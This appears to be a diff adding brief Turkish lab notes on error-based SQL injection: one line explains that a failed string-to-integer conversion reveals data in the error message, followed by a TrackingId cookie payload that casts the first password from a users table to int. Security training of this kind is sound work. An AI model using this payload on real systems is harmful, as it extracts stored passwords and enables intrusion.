@@ -1,0 +1,3 @@
+STR verisini INT'a çevirirken hata oluşuyor ve bu sayede veriyi hata içerisinde görebiliyoruz.
+
+TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
